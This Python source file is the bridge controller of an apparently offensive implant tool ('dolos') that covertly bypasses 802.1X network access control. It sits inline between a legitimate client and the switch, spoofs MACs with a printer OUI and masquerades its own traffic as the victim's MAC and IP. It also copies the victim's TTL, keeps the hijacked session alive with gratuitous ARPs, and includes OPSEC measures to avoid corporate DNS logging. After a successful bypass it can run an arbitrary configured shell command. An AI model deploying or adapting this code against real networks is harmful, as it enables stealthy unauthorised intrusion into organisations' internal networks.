"""Bridge controller — manages the network bridge, iptables/ebtables/arptables
rules, and coordinates with NetInfo for automatic NAC bypass.

This is a faithful port of the original JS bridge_controller.js with the
following improvements:
  - Uses subprocess.run instead of execSync for better error handling
  - Validates interface names to prevent command injection
  - Structured logging with timestamps
"""

import logging
import os
import re
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any, Callable

from net_info import NetInfo

log = logging.getLogger("dolos.bridge")

LOG_DIR = Path(__file__).parent / "logs"
LOG_DIR.mkdir(exist_ok=True)


_IFACE_RE = re.compile(r"^[a-zA-Z0-9._-]+$")


def _validate_iface(name: str) -> str:
    if not _IFACE_RE.match(name):
        raise ValueError(f"Invalid interface name: {name!r}")
    return name


def _validate_ip_or_cidr(value: str) -> str:
    # basic validation - IPs, CIDRs, MAC addresses
    if not re.match(r"^[0-9a-fA-F.:/-]+$", value):
        raise ValueError(f"Invalid network value: {value!r}")
    return value


def _validate_mac(value: str) -> str:
    if not re.match(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$", value):
        raise ValueError(f"Invalid MAC address: {value!r}")
    return value


class BridgeController:
    def __init__(self, config: dict[str, Any]) -> None:
        self.bridge_name = "mibr"
        self.bridge_subnet = "169.254.0.0/16"
        self.bridge_ip = "169.254.66.77"
        self.bridge_mac = "00:01:01:01:01:01"
        self.ephemeral_ports = "61000-62000"
        self.virtual_gateway_ip = "169.254.66.55"

        self.mgmt_subnet = config["management_subnet"]
        self.nic1 = _validate_iface(config["network_interface1"])
        self.nic2 = _validate_iface(config["network_interface2"])
        self.replace_default_route: bool = config.get("replace_default_route", False)
        self.run_command_on_success: bool = config.get("run_command_on_success", False)
        self.autorun_command: str = config.get("autorun_command", "")

        # MAC to present on attack NICs (default: Lexmark printer OUI)
        # Set to "" or remove from config to skip NIC MAC spoofing
        base_mac = (config.get("spoof_mac") or "").strip().lower()
        if base_mac:
            _validate_mac(base_mac)
            parts = base_mac.split(":")
            parts[-1] = f"{(int(parts[-1], 16) + 1) & 0xFF:02x}"
            self.spoof_mac1 = base_mac
            self.spoof_mac2 = ":".join(parts)
        else:
            self.spoof_mac1 = ""
            self.spoof_mac2 = ""

        self.gateway_side_interface: str = ""
        self.client_side_interface: str = ""

        # read HW addresses for our NICs
        self.int_to_mac: dict[str, str] = {}
        for nic in (self.nic1, self.nic2):
            self.int_to_mac[nic] = self._read_mac(nic)

        # event callbacks
        self._callbacks: dict[str, list[Callable]] = {}

        # logging (append — dolos.py truncates current.log at startup)
        self._history_log = open(LOG_DIR / "history.log", "a")
        self._current_log = open(LOG_DIR / "current.log", "a")

        self.net_info: NetInfo | None = None

        # track which interfaces we've already allowed
        self._allowed_ifaces: set[str] = set()
        self._iface_watcher_stop = threading.Event()
        # track which ARP entries we've already seen
        self._seen_arp: set[str] = set()
        self._dhcp_probe_timer: threading.Timer | None = None
        self.bridge_start_time: float = 0.0
        self._arp_keepalive_stop = threading.Event()
        self._spoofed_client_mac: str = ""
        self._spoofed_client_ip: str = ""
        self._spoofed_gateway_mac: str = ""
        self._spoofed_gateway_ip: str = ""

    # ── callback helpers ─────────────────────────────────────────────

    def on(self, event: str, callback: Callable) -> None:
        self._callbacks.setdefault(event, []).append(callback)

    def _emit(self, event: str, data: Any = None) -> None:
        for cb in self._callbacks.get(event, []):
            try:
                cb(data)
            except Exception:
                log.exception("Error in %s callback", event)

    # ── dynamic interface management ─────────────────────────────────

    def _allow_non_attack_interfaces(self) -> None:
        """Allow traffic on any interface that is NOT part of the bridge attack.

        Safely called multiple times — tracks which interfaces have already
        been allowed so rules aren't duplicated.
        """
        excluded = {self.bridge_name, self.nic1, self.nic2, "lo"}
        for iface in self._list_interfaces():
            if iface in excluded or iface in self._allowed_ifaces:
                continue
            if not _IFACE_RE.match(iface):
                continue
            log.info("Allowing traffic on new interface: %s", iface)
            self._os_cmd(f"Allow ebtables on {iface}", f"ebtables -A OUTPUT -o {iface} -j ACCEPT")
            self._os_cmd(f"Allow iptables on {iface}", f"iptables -A OUTPUT -o {iface} -j ACCEPT")
            self._os_cmd(f"Allow arptables on {iface}", f"arptables -A OUTPUT -o {iface} -j ACCEPT")
            self._allowed_ifaces.add(iface)

    def _start_iface_watcher(self) -> None:
        """Background thread that watches for new interfaces (LTE, Tailscale, etc.)
        and adds firewall allow rules when they appear."""
        def _watch():
            while not self._iface_watcher_stop.is_set():
                self._allow_non_attack_interfaces()
                self._iface_watcher_stop.wait(5)  # check every 5 seconds
        t = threading.Thread(target=_watch, daemon=True, name="iface-watcher")
        t.start()

    # ── OS helpers ───────────────────────────────────────────────────

    @staticmethod
    def _list_interfaces() -> list[str]:
        """List network interfaces from /sys/class/net (no external deps)."""
        try:
            return os.listdir("/sys/class/net")
        except OSError:
            return []

    @staticmethod
    def _read_mac(iface: str) -> str:
        path = f"/sys/class/net/{_validate_iface(iface)}/address"
        return Path(path).read_text().strip()

    def _log_to_file(self, line: str) -> None:
        """Write a timestamped line to both log files."""
        from datetime import datetime
        ts = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
        entry = f"{ts}  {line}\n"
        self._history_log.write(entry)
        self._current_log.write(entry)
        self._history_log.flush()
        self._current_log.flush()

    def _os_cmd(self, comment: str, cmd: str) -> str:
        log.info("INFO: %s", comment)
        log.info("COMMAND: %s", cmd)
        self._log_to_file(f"INFO: {comment}")
        self._log_to_file(f"COMMAND: {cmd}")
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=10
            )
            output = result.stdout.strip()
            if result.stderr.strip():
                output += "\n" + result.stderr.strip()
            if output:
                log.info("OUTPUT: %s", output)
                self._log_to_file(f"OUTPUT: {output}")
            return result.stdout.strip()
        except subprocess.TimeoutExpired:
            log.error("Command timed out: %s", cmd)
            return ""
        except Exception as exc:
            log.error("Command failed: %s — %s", cmd, exc)
            return ""

    def get_int_for_smac(self, mac_addr: str) -> str:
        mac_addr = _validate_mac(mac_addr)
        if_number = self._os_cmd(
            "Get bridge port for MAC",
            f"brctl showmacs {self.bridge_name} | grep {mac_addr} | awk '{{print $1}}'",
        )
        interface_name = self._os_cmd(
            "Get interface name for bridge port",
            f"brctl showstp {self.bridge_name} | grep '({if_number})' | head -n1 | awk '{{print $1}}'",
        )
        return interface_name

    # ── bridge lifecycle ─────────────────────────────────────────────

    def start_bridge(self) -> None:
        oc = self._os_cmd

        oc("Add arptable filter", "modprobe arptable_filter")

        # policy: drop all outbound from our device
        oc("Allow loopback traffic", "iptables -A OUTPUT -o lo -j ACCEPT")
        oc("Drop all outbound IP traffic", "iptables -P OUTPUT DROP")
        oc("Drop all outbound IPv6 traffic", "ip6tables -A OUTPUT -o lo -j ACCEPT")
        oc("Drop all outbound IPv6 traffic", "ip6tables -P OUTPUT DROP")
        oc("Drop all outbound Ethernet traffic", "ebtables -P OUTPUT DROP")
        oc("Drop all outbound ARP traffic", "arptables -P OUTPUT DROP")

        # allow traffic on non-attack interfaces (including future LTE/Tailscale)
        self._allow_non_attack_interfaces()

        # additional EtherType blocks
        for etype in ("0x0806", "0x0808", "0x8035", "0x80F3"):
            oc(f"Block EtherType {etype}", f"ebtables -A OUTPUT -p {etype} -j DROP")

        # stop NetworkManager from managing attack NICs
        oc(f"Unmanage {self.nic1}", f"nmcli d set {self.nic1} managed no")
        oc(f"Unmanage {self.nic2}", f"nmcli d set {self.nic2} managed no")

        # ── MAC spoofing (pre-bridge) ────────────────────────────────
        # Bring NICs down and change their MAC addresses BEFORE they join
        # the bridge and come up.  The hwaddress directive in interfaces.d
        # already set this at boot, but we re-apply here as defense-in-depth
        # (in case something reset the MAC).  The two NICs get different
        # last bytes so the bridge can still distinguish ports.  Once
        # discovery completes, ebtables SNAT rewrites all outbound frames
        # to the real client/gateway MAC.
        if self.spoof_mac1:
            oc(f"{self.nic1} down for MAC change", f"ip link set dev {self.nic1} down")
            oc(f"{self.nic2} down for MAC change", f"ip link set dev {self.nic2} down")
            oc(f"Spoof {self.nic1} MAC → {self.spoof_mac1}", f"ip link set dev {self.nic1} address {self.spoof_mac1}")
            oc(f"Spoof {self.nic2} MAC → {self.spoof_mac2}", f"ip link set dev {self.nic2} address {self.spoof_mac2}")

            # update the MAC lookup table — ebtables SNAT rules use these
            self.int_to_mac[self.nic1] = self.spoof_mac1
            self.int_to_mac[self.nic2] = self.spoof_mac2
        else:
            log.info("NIC MAC spoofing disabled (no spoof_mac in config)")

        # load kernel modules
        oc("Load arptable_filter", "modprobe arptable_filter")
        oc("Load br_netfilter", "modprobe br_netfilter")

        # create the bridge
        oc("Create bridge", f"brctl addbr {self.bridge_name}")
        oc("Disable STP on bridge", f"brctl stp {self.bridge_name} off")

        # fully disable IPv6 — autoconf/accept_ra alone still allows
        # link-local addresses which leak the bridge's presence
        for dev in (self.bridge_name, self.nic1, self.nic2):
            oc(f"Disable IPv6 on {dev}", f"sysctl -w net.ipv6.conf.{dev}.disable_ipv6=1")
            oc(f"Disable IPv6 autoconf on {dev}", f"sysctl -w net.ipv6.conf.{dev}.autoconf=0")
            oc(f"Ignore IPv6 RA on {dev}", f"sysctl -w net.ipv6.conf.{dev}.accept_ra=0")

        # promiscuous mode
        for dev in (self.bridge_name, self.nic1, self.nic2):
            oc(f"Promisc on {dev}", f"ip link set dev {dev} promisc on")

        # add NICs to bridge
        oc(f"Add {self.nic1} to bridge", f"brctl addif {self.bridge_name} {self.nic1}")
        oc(f"Add {self.nic2} to bridge", f"brctl addif {self.bridge_name} {self.nic2}")

        # configure bridge
        oc("Assign APIPA IP to bridge", f"ip addr add {self.bridge_ip}/16 dev {self.bridge_name}")
        oc("Set bridge MAC and disable ARP", f"ip link set dev {self.bridge_name} address {self.bridge_mac} arp off")

        # bring interfaces up
        oc("Bridge up", f"ip link set dev {self.bridge_name} up")
        oc(f"{self.nic1} up", f"ip link set dev {self.nic1} up")
        oc(f"{self.nic2} up", f"ip link set dev {self.nic2} up")

        # optionally replace default route
        if self.replace_default_route:
            dr = oc("Get default route", "ip route | grep default | head")
            if dr:
                try:
                    oc("Delete default route", f"ip route delete {dr} >/dev/null 2>&1")
                except Exception as exc:
                    log.warning("Could not delete default route: %s", exc)

        # allow 802.1X EAPOL
        oc("Allow EAPOL 802.1X", f"echo 8 > /sys/class/net/{self.bridge_name}/bridge/group_fwd_mask")

        # start network info tracker
        self.net_info = NetInfo(self.bridge_name, self.bridge_mac)

        self.net_info.on("new_arp", lambda info: self.new_arp(info))
        self.net_info.on("network_update", lambda _: (
            self._emit("bridge_update", {"type": "network_info", "data": self.net_info.print_info()}),
        ))
        self.net_info.on("dns_update", lambda servers: (
            self._emit("bridge_update", {"type": "dns_update", "data": servers}),
            self.update_dns(servers),
        ))
        self.net_info.once("client_ip_mac_and_gateway_mac", lambda info: (
            self._emit("bridge_update", {"type": "cimagm", "data": info}),
            self.spoof_client_to_gateway(info),
            self._log_discovery_summary(),
        ))
        self.net_info.once("gateway_ip_mac_and_client_mac", lambda info: (
            self._emit("bridge_update", {"type": "gimacm", "data": info}),
            self.spoof_gateway_to_client(info),
            self._log_discovery_summary(),
        ))
        self.net_info.once("client_ttl", lambda info: (
            self._emit("bridge_update", {"type": "client_ttl", "data": info}),
            self.modify_ttl(info),
            self._log_discovery_summary(),
        ))

        self.net_info.start()
        self.bridge_start_time = time.time()
        self._emit("bridge_up", self.bridge_name)

        # start watching for new interfaces (LTE dongle, Tailscale, etc.)
        self._start_iface_watcher()

        # auto DHCP probe: if gateway not detected after 60s, send a DHCP discover
        self._dhcp_probe_timer = threading.Timer(60.0, self._auto_dhcp_probe)
        self._dhcp_probe_timer.daemon = True
        self._dhcp_probe_timer.start()

    def allow_internet_traffic(self) -> None:
        try:
            self._os_cmd("Clear existing default route", "ip route del default")
        except Exception:
            pass
        self._os_cmd(
            "Add bridge as default route",
            f"ip route add default via {self.virtual_gateway_ip} dev {self.bridge_name}",
        )

    def flush_tables(self, shutdown: bool = False) -> None:
        oc = self._os_cmd
        self.restore_default_dns()
        oc("Clear ebtables", "ebtables -F")
        oc("Clear ebtables filter", "ebtables -t filter -F")
        oc("Clear ebtables NAT", "ebtables -t nat -F")
        oc("Clear iptables", "iptables -F")
        oc("Clear iptables filter", "iptables -t filter -F")
        oc("Clear iptables NAT", "iptables -t nat -F")
        oc("Clear iptables mangle", "iptables -t mangle -F")
        oc("Clear iptables raw", "iptables -t raw -F")
        oc("Clear ip6tables", "ip6tables -F")
        oc("Reset ip6tables policy", "ip6tables -P OUTPUT ACCEPT")

        self._allow_non_attack_interfaces()

        self.stop_bridge(shutdown)

    def stop_bridge(self, shutdown: bool = False) -> None:
        if not shutdown:
            return
        self._iface_watcher_stop.set()
        self._arp_keepalive_stop.set()
        if self._dhcp_probe_timer:
            self._dhcp_probe_timer.cancel()
            self._dhcp_probe_timer = None
        oc = self._os_cmd
        if self.net_info:
            self.net_info.stop()
        oc(f"Remove {self.nic1} from bridge", f"brctl delif {self.bridge_name} {self.nic1}")
        oc(f"Remove {self.nic2} from bridge", f"brctl delif {self.bridge_name} {self.nic2}")
        oc("Bridge down", f"ip link set dev {self.bridge_name} down")
        oc("Delete bridge", f"brctl delbr {self.bridge_name}")
        oc(f"Manage {self.nic1}", f"nmcli d set {self.nic1} managed yes")
        oc(f"Manage {self.nic2}", f"nmcli d set {self.nic2} managed yes")
        self._history_log.close()
        self._current_log.close()
        sys.exit(0)

    # ── spoofing rules ───────────────────────────────────────────────

    def modify_ttl(self, info: dict) -> None:
        ttl = info.get("client_ttl", "")
        if ttl:
            self._os_cmd(
                "Spoof client TTL",
                f"iptables -t mangle -A POSTROUTING -o {self.bridge_name} -j TTL --ttl-set {ttl}",
            )

    def spoof_client_to_gateway(self, info: dict) -> None:
        # cancel auto DHCP probe timer — gateway found
        if self._dhcp_probe_timer:
            self._dhcp_probe_timer.cancel()
            self._dhcp_probe_timer = None

        oc = self._os_cmd
        client_mac = _validate_mac(info["client_mac"])
        gateway_mac = _validate_mac(info["gateway_mac"])
        client_ip = _validate_ip_or_cidr(info["client_ip"])

        self.gateway_side_interface = self.get_int_for_smac(gateway_mac)
        gsi = self.gateway_side_interface

        # MAC spoofing — tag outbound frames toward switch with client's MAC
        oc(
            "SNAT bridge→switch with client MAC",
            f"ebtables -t nat -A POSTROUTING -s {self.int_to_mac[gsi]} -o {gsi} -j snat --snat-arp --to-src {client_mac}",
        )
        oc(
            "SNAT bridge_mac→switch with client MAC",
            f"ebtables -t nat -A POSTROUTING -s {self.bridge_mac} -o {gsi} -j snat --snat-arp --to-src {client_mac}",
        )

        # IP masquerading toward switch
        for proto in ("tcp", "udp"):
            for src_subnet in (self.mgmt_subnet, self.bridge_subnet):
                oc(
                    f"SNAT {proto} {src_subnet}→switch as {client_ip}",
                    f"iptables -t nat -A POSTROUTING -o {self.bridge_name} -s {src_subnet} -p {proto} -j SNAT --to {client_ip}:{self.ephemeral_ports}",
                )
        for src_subnet in (self.mgmt_subnet, self.bridge_subnet):
            oc(
                f"SNAT icmp {src_subnet}→switch as {client_ip}",
                f"iptables -t nat -A POSTROUTING -o {self.bridge_name} -s {src_subnet} -p icmp -j SNAT --to {client_ip}",
            )

        # virtual gateway neighbour entry
        oc(
            "Create virtual gateway ARP entry",
            f"ip neigh add {self.virtual_gateway_ip} lladdr {gateway_mac} dev {self.bridge_name}",
        )

        # routing
        if self.replace_default_route:
            oc("Add default route via virtual GW", f"ip route add default via {self.virtual_gateway_ip} dev {self.bridge_name}")
        else:
            private_ranges = [
                "10.0.0.0/8", "192.168.0.0/16",
                "172.16.0.0/13", "172.24.0.0/14", "172.28.0.0/15",
                "172.30.0.0/16", "172.31.0.0/17", "172.31.128.0/18",
                "172.31.192.0/19", "172.31.224.0/20", "172.31.240.0/21",
                "172.31.248.0/22", "172.31.252.0/23", "172.31.254.0/24",
            ]
            for rng in private_ranges:
                oc(f"Route {rng} via bridge", f"ip route add {rng} via {self.virtual_gateway_ip} dev {self.bridge_name}")

        oc("Enable IP forwarding", "echo 1 > /proc/sys/net/ipv4/ip_forward")
        oc("Allow outbound to switch", f"ebtables -A OUTPUT -o {gsi} -j ACCEPT")
        oc("Allow bridge IP outbound", f"iptables -A OUTPUT -o {self.bridge_name} -s {self.bridge_ip} -j ACCEPT")

        # store for gratuitous ARP keepalive
        self._spoofed_client_mac = client_mac
        self._spoofed_client_ip = client_ip
        self._spoofed_gateway_mac = gateway_mac

        if self.run_command_on_success:
            oc("Autorun command", self.autorun_command)

    def spoof_gateway_to_client(self, info: dict) -> None:
        oc = self._os_cmd
        client_mac = _validate_mac(info["client_mac"])
        gateway_mac = _validate_mac(info["gateway_mac"])
        client_ip = _validate_ip_or_cidr(info["client_ip"])
        gateway_ip = _validate_ip_or_cidr(info["gateway_ip"])

        self.client_side_interface = self.get_int_for_smac(client_mac)
        csi = self.client_side_interface

        # MAC spoofing — tag outbound frames toward client with gateway's MAC
        oc(
            "SNAT bridge→client with gateway MAC",
            f"ebtables -t nat -A POSTROUTING -s {self.int_to_mac[csi]} -o {csi} -j snat --snat-arp --to-src {gateway_mac}",
        )

        # IP masquerading toward client
        for proto in ("tcp", "udp"):
            for src_subnet in (self.bridge_subnet, self.mgmt_subnet):
                oc(
                    f"SNAT {proto} bridge→client as {gateway_ip}",
                    f"iptables -t nat -A POSTROUTING -o {self.bridge_name} -s {src_subnet} -d {client_ip} -p {proto} -j SNAT --to {gateway_ip}:{self.ephemeral_ports}",
                )
        for src_subnet in (self.bridge_subnet, self.mgmt_subnet):
            oc(
                f"SNAT icmp bridge→client as {gateway_ip}",
                f"iptables -t nat -A POSTROUTING -o {self.bridge_name} -s {src_subnet} -d {client_ip} -p icmp -j SNAT --to {gateway_ip}",
            )

        oc("Allow outbound to client", f"ebtables -A OUTPUT -o {csi} -j ACCEPT")

        # store gateway IP and start ARP keepalive
        self._spoofed_gateway_ip = gateway_ip
        self._start_arp_keepalive()

    # ── ARP keepalive ────────────────────────────────────────────────

    def _start_arp_keepalive(self) -> None:
        """Send periodic gratuitous ARPs on the bridge to keep the gateway's
        ARP cache entry alive for the client IP.  Without this, a sleeping
        client causes the gateway to drop the ARP entry and return traffic
        for our SNAT'd connections stops flowing."""
        def _keepalive():
            from scapy.all import ARP, Ether, sendp
            while not self._arp_keepalive_stop.is_set():
                try:
                    # gratuitous ARP: "client_ip is-at client_mac"
                    pkt = (
                        Ether(src=self._spoofed_client_mac, dst="ff:ff:ff:ff:ff:ff")
                        / ARP(
                            op="is-at",
                            hwsrc=self._spoofed_client_mac,
                            psrc=self._spoofed_client_ip,
                            hwdst="ff:ff:ff:ff:ff:ff",
                            pdst=self._spoofed_client_ip,
                        )
                    )
                    sendp(pkt, iface=self.gateway_side_interface, verbose=False)
                    log.debug("ARP keepalive sent for %s", self._spoofed_client_ip)
                except Exception:
                    log.debug("ARP keepalive failed", exc_info=True)
                self._arp_keepalive_stop.wait(30)  # every 30 seconds

        t = threading.Thread(target=_keepalive, daemon=True, name="arp-keepalive")
        t.start()
        log.info("ARP keepalive started (every 30s) for %s / %s",
                 self._spoofed_client_ip, self._spoofed_client_mac)

    def _log_discovery_summary(self) -> None:
        """Log a structured summary of all discovered network information.
        Called after each spoofing phase — only logs if key info is available."""
        if not self.net_info:
            return
        ni = self.net_info
        # only log the full summary once we have both client and gateway
        if not ni.client_ip or not ni.gateway_ip:
            return
        sep = "=" * 60
        lines = [
            "",
            sep,
            "  DISCOVERY SUMMARY",
            sep,
            "",
            "  TARGET (Spoofing as):",
            f"    IP:       {ni.client_ip}",
            f"    MAC:      {ni.client_mac}",
            f"    Hostname: {ni.client_name or '(not yet resolved)'}",
            f"    TTL:      {ni.client_ttl or '(not yet detected)'}",
            "",
            "  GATEWAY / NETWORK:",
            f"    Gateway IP:  {ni.gateway_ip}",
            f"    Gateway MAC: {ni.gateway_mac}",
            f"    Subnet:      {ni.subnet_mask or '(unknown)'}",
            f"    Domain:      {ni.search_domain or '(unknown)'}",
            f"    DHCP Server: {ni.dhcp_server or '(unknown)'}",
            f"    NTP Server:  {ni.ntp_server or '(unknown)'}",
            "",
            "  DNS SERVERS:",
        ]
        if ni.dns_servers:
            for dns in ni.dns_servers:
                lines.append(f"    - {dns}")
        else:
            lines.append("    (none discovered yet)")
        lines += [
            "",
            "  BRIDGE INTERFACES:",
            f"    Gateway-side: {self.gateway_side_interface or '(unknown)'}",
            f"    Client-side:  {self.client_side_interface or '(unknown)'}",
            "",
            sep,
        ]
        log.info("\n".join(lines))
        # also write to the manual log files
        for line in lines:
            if line:  # skip empty lines used for spacing
                self._log_to_file(line)

    # ── runtime actions ──────────────────────────────────────────────

    def _auto_dhcp_probe(self) -> None:
        """Called by timer — sends DHCP discover if gateway still unknown."""
        if self.net_info and not self.net_info.gateway_ip:
            log.info("Auto DHCP probe: gateway not detected after 60s, sending DHCP discover")
            self._emit("bridge_update", {"type": "auto_dhcp_probe", "data": "Sending automatic DHCP probe"})
            self.send_dhcp_probe()

    def send_dhcp_probe(self) -> None:
        if self.net_info and self.net_info.client_ip and self.net_info.client_mac:
            from dhcp_probe import send_dhcp_discover
            send_dhcp_discover(self.bridge_name, self.net_info.client_mac, self.net_info.client_ip)

    def update_dns(self, dns_servers: list[str]) -> None:
        """Save discovered DNS servers to discovered_dns.conf (NOT resolv.conf).

        resolv.conf stays pointed at 8.8.8.8 (via LTE) so the Pi's own
        system traffic (Tailscale, etc.) never touches corp DNS.  The
        discovered servers are saved separately and only used explicitly
        by the operator (dig, or the Apply DNS button)."""
        log.info("Discovered DNS: %s", dns_servers)
        dns_file = Path(__file__).parent / "discovered_dns.conf"
        with open(dns_file, "w") as f:
            for server in dns_servers:
                server = _validate_ip_or_cidr(server)
                f.write(f"nameserver {server}\n")
        log.info("Wrote discovered DNS to %s", dns_file)
        # add routes so corp DNS is reachable through the bridge if needed
        for server in dns_servers:
            server = _validate_ip_or_cidr(server)
            self._os_cmd(
                f"Route to DNS server {server}",
                f"ip route replace {server}/32 via {self.virtual_gateway_ip} dev {self.bridge_name}",
            )

    def apply_discovered_dns(self) -> str:
        """Manually apply discovered DNS servers to /etc/resolv.conf.

        Only call this when the operator explicitly wants the Pi to use
        corp DNS (e.g. for domain-joined lookups).  This WILL make the
        Pi's own traffic visible to corp DNS logging."""
        dns_file = Path(__file__).parent / "discovered_dns.conf"
        if not dns_file.exists():
            return "No discovered DNS servers yet"
        content = dns_file.read_text().strip()
        if not content:
            return "No discovered DNS servers yet"
        self._os_cmd("Unlock resolv.conf", "chattr -i /etc/resolv.conf")
        self._os_cmd("Write discovered DNS to resolv.conf", f"cp {str(dns_file)} /etc/resolv.conf")
        self._os_cmd("Lock resolv.conf", "chattr +i /etc/resolv.conf")
        log.warning("OPSEC: resolv.conf now points to corp DNS — Pi system traffic is visible")
        return f"Applied corp DNS to resolv.conf:\n{content}"

    def restore_default_dns(self) -> str:
        """Restore resolv.conf to the safe default (8.8.8.8 via LTE)."""
        self._os_cmd("Unlock resolv.conf", "chattr -i /etc/resolv.conf")
        self._os_cmd("Restore default DNS", "echo 'nameserver 8.8.8.8' > /etc/resolv.conf")
        self._os_cmd("Lock resolv.conf", "chattr +i /etc/resolv.conf")
        log.info("resolv.conf restored to 8.8.8.8")
        return "Restored resolv.conf to nameserver 8.8.8.8"

    def new_arp(self, arp_info: dict) -> None:
        ip = arp_info.get("sender_ip") or arp_info.get("ip", "")
        mac = arp_info.get("sender_mac") or arp_info.get("mac", "")
        if ip and mac:
            key = f"{mac}:{ip}"
            if key in self._seen_arp:
                return
            self._seen_arp.add(key)
            self._emit("bridge_update", {"type": "new_arp", "data": arp_info})
            ip = _validate_ip_or_cidr(ip)
            mac = _validate_mac(mac)
            self._os_cmd(f"ARP neighbour {ip}", f"ip neigh replace {ip} lladdr {mac} dev {self.bridge_name}")
            self._os_cmd(f"Route to {ip}", f"ip route replace {ip}/32 dev {self.bridge_name}")
